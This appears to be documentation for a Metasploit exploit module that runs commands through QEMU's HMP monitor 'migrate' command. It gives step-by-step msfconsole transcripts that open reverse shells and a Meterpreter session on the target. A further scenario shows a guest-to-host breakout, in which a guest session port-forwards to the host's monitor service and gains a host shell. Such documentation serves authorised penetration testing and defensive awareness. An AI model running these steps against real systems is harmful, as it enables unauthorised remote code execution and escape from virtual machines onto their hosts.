## Vulnerable Application

This module uses QEMU's Monitor Human Monitor Interface (HMP)
TCP server to execute system commands using the `migrate` command.

This module has been tested successfully on QEMU version 6.2.0
on Ubuntu 20.04.

Note: The `migrate` command cannot spawn processes for QEMU
running on Windows systems.


## Installation Steps

Download and install [QEMU](https://www.qemu.org/download/).


## Verification Steps

Start QEMU and monitor HMP service using TCP:

```
qemu-system-aarch64 -M virt -monitor tcp:0.0.0.0:4444,server,nowait -serial mon:stdio -nographic
```

1. `msfconsole`
1. `use exploit/multi/misc/qemu_monitor_hmp_migrate_cmd_exec`
1. `set rhosts [host]`
1. `set rport [port]`
1. `set target [target]`
1. `run`
1. You should get a session


## Options


## Scenarios

### Unix Command Target

```
msf6 > use exploit/multi/misc/qemu_monitor_hmp_migrate_cmd_exec
[*] Using configured payload cmd/unix/reverse
msf6 exploit(multi/misc/qemu_monitor_hmp_migrate_cmd_exec) > set rhosts 172.16.191.240
rhosts => 172.16.191.240
msf6 exploit(multi/misc/qemu_monitor_hmp_migrate_cmd_exec) > set rport 4444
rport => 4444
msf6 exploit(multi/misc/qemu_monitor_hmp_migrate_cmd_exec) > set lhost 172.16.191.192
lhost => 172.16.191.192
msf6 exploit(multi/misc/qemu_monitor_hmp_migrate_cmd_exec) > run

[*] Started reverse TCP double handler on 172.16.191.192:4444 
[*] 172.16.191.240:4444 - Running automatic check ("set AutoCheck false" to disable)
[+] 172.16.191.240:4444 - The target appears to be vulnerable. QEMU monitor HMP service is running.
[*] 172.16.191.240:4444 - Sending payload (128 bytes) ...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo RDx8lJn8owvPaWYr;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "sh: 2: Connected: not found\r\nsh: 3: Escape: not found\r\nRDx8lJn8owvPaWYr\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (172.16.191.192:4444 -> 172.16.191.240:41054 ) at 2022-02-05 23:30:49 -0500

id
uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),1002(wireshark)
```

### Linux Dropper Target

```
msf6 > use exploit/multi/misc/qemu_monitor_hmp_migrate_cmd_exec
[*] Using configured payload cmd/unix/reverse
msf6 exploit(multi/misc/qemu_monitor_hmp_migrate_cmd_exec) > set rhosts 172.16.191.240
rhosts => 172.16.191.240
msf6 exploit(multi/misc/qemu_monitor_hmp_migrate_cmd_exec) > set rport 4444
rport => 4444
msf6 exploit(multi/misc/qemu_monitor_hmp_migrate_cmd_exec) > set target 2
target => 2
msf6 exploit(multi/misc/qemu_monitor_hmp_migrate_cmd_exec) > set target "Linux (Dropper)" 
target => Linux (Dropper)
msf6 exploit(multi/misc/qemu_monitor_hmp_migrate_cmd_exec) > set lhost 172.16.191.192 
lhost => 172.16.191.192
msf6 exploit(multi/misc/qemu_monitor_hmp_migrate_cmd_exec) > run

[*] Started reverse TCP handler on 172.16.191.192:4444 
[*] 172.16.191.240:4444 - Running automatic check ("set AutoCheck false" to disable)
[+] 172.16.191.240:4444 - The target appears to be vulnerable. QEMU monitor HMP service is running.
[*] 172.16.191.240:4444 - Sending payload (178 bytes) ...
[*] Sending stage (989032 bytes) to 172.16.191.240
[*] 172.16.191.240:4444 - Command Stager progress - 100.00% done (849/849 bytes)
[*] Meterpreter session 1 opened (172.16.191.192:4444 -> 172.16.191.240:41050 ) at 2022-02-05 23:24:56 -0500

meterpreter > getuid
Server username: user
meterpreter > 
```

### QEMU Breakout

The HMP TCP service is reachable from emulated devices, even when the service is
bound to the local network interface only (ie, `-monitor tcp:127.0.0.1:4444`), as
all network traffic from the emulated network adapter is routed via the QEMU host.

As such, it is possible to escape QEMU from a session within an emulated device
(10.0.2.15) and gain a session on the QEMU host (10.0.2.2).

```
msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer     : debian-9-13-0-mipsel.local
OS           : Debian 11.2 (Linux 5.10.0-10-4kc-malta)
Architecture : mips
BuildTuple   : mipsel-linux-muslsf
Meterpreter  : mipsle/linux
meterpreter > ipconfig 

Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::


Interface  2
============
Name         : enp0s11
Hardware MAC : 52:54:00:12:34:56
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 10.0.2.15
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::5054:ff:fe12:3456
IPv6 Netmask : ffff:ffff:ffff:ffff::
IPv6 Address : fec0::5054:ff:fe12:3456
IPv6 Netmask : ffff:ffff:ffff:ffff::

meterpreter > portfwd add -l 1234 -p 4444 -r 10.0.2.2
[*] Local TCP relay created: :1234 <-> 10.0.2.2:4444
meterpreter >
Background session 1? [y/N]
msf6 exploit(multi/handler) > use exploit/multi/misc/qemu_monitor_hmp_migrate_cmd_exec
[*] Using configured payload cmd/unix/reverse
msf6 exploit(multi/misc/qemu_monitor_hmp_migrate_cmd_exec) > set rport 1234
rport => 1234
msf6 exploit(multi/misc/qemu_monitor_hmp_migrate_cmd_exec) > set rhost 127.0.0.1
rhost => 127.0.0.1
msf6 exploit(multi/misc/qemu_monitor_hmp_migrate_cmd_exec) > check
[*] 127.0.0.1:1234 - The target appears to be vulnerable. QEMU monitor HMP service is running.
msf6 exploit(multi/misc/qemu_monitor_hmp_migrate_cmd_exec) > set lhost 172.16.191.192
lhost => 172.16.191.192
msf6 exploit(multi/misc/qemu_monitor_hmp_migrate_cmd_exec) > run

[*] Started reverse TCP double handler on 172.16.191.192:4444 
[*] 127.0.0.1:1234 - Running automatic check ("set AutoCheck false" to disable)
[+] 127.0.0.1:1234 - The target appears to be vulnerable. QEMU monitor HMP service is running.
[*] 127.0.0.1:1234 - Sending payload (128 bytes) ...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo Rl19l7hvy8EO5hPz;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "Rl19l7hvy8EO5hPz\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 2 opened (172.16.191.192:4444 -> 172.16.191.240:41056 ) at 2022-02-06 12:54:42 -0500

uname -a
Linux ubuntu 5.13.0-27-generic #29~20.04.1-Ubuntu SMP Fri Jan 14 00:32:30 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```
